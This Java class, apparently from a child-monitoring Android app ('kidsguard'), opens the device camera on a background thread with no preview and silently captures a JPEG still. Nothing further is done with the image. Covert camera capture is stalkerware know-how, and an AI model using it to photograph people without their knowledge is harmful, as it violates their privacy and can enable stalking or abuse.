package com.kidsguard.child;

import android.content.Context;
import android.graphics.ImageFormat;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.media.ImageReader;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Log;
import android.view.Surface;
import androidx.annotation.NonNull;
import java.util.Collections;

public class BackgroundCamera {
    private static final String TAG = "BackgroundCamera";
    private CameraDevice cameraDevice;
    private CameraCaptureSession captureSession;
    private ImageReader imageReader;
    private Surface readerSurface;
    private HandlerThread backgroundThread;
    private Handler backgroundHandler;

    public void initialize(Context context) {
        backgroundThread = new HandlerThread("CameraBackground");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());

        CameraManager manager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
        try {
            if (manager == null || manager.getCameraIdList().length == 0) return;
            String cameraId = manager.getCameraIdList()[0];
            if (context.checkSelfPermission(android.Manifest.permission.CAMERA) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
                manager.openCamera(cameraId, stateCallback, backgroundHandler);
            }
        } catch (Exception e) {
            Log.e(TAG, "Camera open failed", e);
        }
    }

    private final CameraDevice.StateCallback stateCallback = new CameraDevice.StateCallback() {
        @Override
        public void onOpened(@NonNull CameraDevice camera) {
            cameraDevice = camera;
            createCaptureSession();
        }
        @Override public void onDisconnected(@NonNull CameraDevice camera) { camera.close(); }
        @Override public void onError(@NonNull CameraDevice camera, int error) { camera.close(); }
    };

    private void createCaptureSession() {
        try {
            imageReader = ImageReader.newInstance(1920, 1080, ImageFormat.JPEG, 1);
            readerSurface = imageReader.getSurface();

            cameraDevice.createCaptureSession(
                    Collections.singletonList(readerSurface),
                    sessionCallback,
                    backgroundHandler
            );
        } catch (Exception e) {
            Log.e(TAG, "Session creation failed", e);
        }
    }

    private final CameraCaptureSession.StateCallback sessionCallback = new CameraCaptureSession.StateCallback() {
        @Override
        public void onConfigured(@NonNull CameraCaptureSession session) {
            captureSession = session;
            triggerCapture();
        }
        @Override public void onConfigureFailed(@NonNull CameraCaptureSession session) {}
    };

    private void triggerCapture() {
        try {
            CaptureRequest.Builder builder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
            builder.addTarget(readerSurface);
            builder.set(CaptureRequest.JPEG_QUALITY, (byte) 90);
            
            captureSession.capture(builder.build(), new CameraCaptureSession.CaptureCallback() {
                @Override
                public void onCaptureCompleted(@NonNull CameraCaptureSession session, @NonNull CaptureRequest request, @NonNull android.hardware.camera2.TotalCaptureResult result) {
                    Log.d(TAG, "Capture completed");
                }
            }, backgroundHandler);
        } catch (Exception e) {
            Log.e(TAG, "Capture trigger failed", e);
        }
    }

    public void release() {
        if (captureSession != null) captureSession.close();
        if (cameraDevice != null) cameraDevice.close();
        if (imageReader != null) imageReader.close();
        if (backgroundThread != null) backgroundThread.quitSafely();
    }
}
